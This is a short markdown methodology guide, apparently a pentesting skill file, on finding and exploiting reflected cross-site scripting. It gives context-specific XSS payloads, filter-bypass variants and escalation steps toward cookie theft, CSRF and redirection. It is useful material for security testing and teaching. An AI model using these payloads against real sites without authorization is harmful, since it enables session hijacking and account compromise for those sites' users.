# XSS Context Analysis — Exploitation Skill

How to find and exploit XSS based on reflection context:

## Step 1: Send a Unique Canary

```
GET /search?q=clinkzXSS12345
```

Use a unique string that won't appear naturally in the page.

## Step 2: Find It in the Response

Search the response body for `clinkzXSS12345`. Note EXACTLY where it appears.

## Step 3: Determine the Context

### a. In HTML Body
```html
<div>clinkzXSS12345</div>
```
Inject: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`

### b. In HTML Attribute
```html
<input value="clinkzXSS12345">
```
Inject: `" onmouseover="alert(1)` or `"><script>alert(1)</script>`

### c. In JavaScript String
```javascript
var x = 'clinkzXSS12345';
```
Inject: `';alert(1)//` or `'-alert(1)-'`

### d. In URL/href
```html
<a href="clinkzXSS12345">
```
Inject: `javascript:alert(1)`

### e. In HTML Comment
```html
<!-- clinkzXSS12345 -->
```
Inject: `--><script>alert(1)</script><!--`

### f. In CSS
```css
.class { background: url(clinkzXSS12345); }
```
Inject: `);} *{background:url(javascript:alert(1))}`

## Step 4: Handle Filters

If basic payload is filtered:
1. Identify WHAT is filtered (which characters/tags are removed or encoded)
2. Craft bypass for the SPECIFIC filter, not random bypasses

### Common Filter Bypasses
- `<script>` blocked → try `<img src=x onerror=alert(1)>`
- `<img>` blocked → try `<svg onload=alert(1)>`
- `alert()` blocked → try `prompt(1)` or `confirm(1)`
- `(` and `)` blocked → try `` alert`1` `` (template literals)
- Event handlers blocked → try `<details open ontoggle=alert(1)>`
- All tags blocked → check if you're in JS context, try breaking out
- Encoding applied → check if double-encoding works: `%253Cscript%253E`

## Step 5: Confirm and Escalate

Once XSS is confirmed:
- Can you steal cookies? (`document.cookie`)
- Is HttpOnly set? (if yes, cookie theft won't work)
- Can you make authenticated requests? (CSRF via XSS)
- Can you redirect users? (`window.location`)
- Is it stored XSS? (persists for other users = higher severity)
